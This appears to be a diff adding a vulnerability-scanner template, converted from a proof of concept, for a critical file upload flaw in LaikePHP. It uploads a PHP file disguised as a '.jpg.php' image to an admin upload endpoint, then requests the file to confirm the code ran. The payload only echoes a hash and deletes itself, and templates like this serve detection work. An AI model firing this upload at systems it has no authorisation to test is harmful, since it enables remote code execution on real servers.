@@ -1,0 +1,50 @@
+id: yaml-poc-laikephp-laikephp-file_upload-CT-416577
+info:
+  name: Yaml Poc Laikephp Laikephp File_Upload Ct 416577
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-laikephp-laikephp-file_upload-CT-416577'
+  tags: fileupload
+  reference: []
+http:
+- method: GET
+  path:
+  - /admin/event/uploadimg.html
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: body
+    words:
+    - editormd-image-file
+- method: POST
+  path:
+  - /admin/event/uploadimg.html
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"editormd-image-file\"; filename=\"{{randname}}.jpg.php\"\r\nContent-Type:\
+    \ application/octet-stream\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\
+    \n------WebKitFormBoundary{{rboundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - .php
+- method: GET
+  path:
+  - /{{dir}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
